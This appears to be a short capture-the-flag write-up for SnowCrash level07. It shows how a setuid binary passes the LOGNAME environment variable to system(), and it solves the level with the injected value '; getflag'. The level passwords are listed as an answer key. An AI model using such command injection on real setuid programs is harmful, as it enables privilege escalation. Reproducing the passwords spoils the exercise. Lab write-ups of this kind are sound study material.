# Solve Level07
pass : wiok45aaoguiboiki2tuin6ub

## Description
- home
    - -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
        - looks like a binary C file
            - find inside with ```strings level07```
                - system()
                - sprintf()
                - /bin/echo ==> this time it use direct path, changing PATH is useless
                - setresuid
                - getenv ==> use to get an env var ==> here 'LOGNAME'
                - setresguid
            - execute
                - print the name of the current user (level07 in snowCrash kali in my local kali machine)

- LOGNAME env var
    - changing the var change the return value of the program
    - removing the var ```unset LOGNAME``` create an error ==> ```sh: 1: Syntax error: word unexpected (expecting ")")```
        - getenv() return null if nothing is pass [source][df1]
    - ```export LOGNAME="; getflag"```

## Solution
- ```export LOGNAME="; getflag"```
- ```./level07```

no flag
level08 : fiumuikeil55xe9cu4dood66h

## Resolve problem
- be carefull when c program use env var

[df1]: https://koor.fr/C/cstdlib/getenv.wp
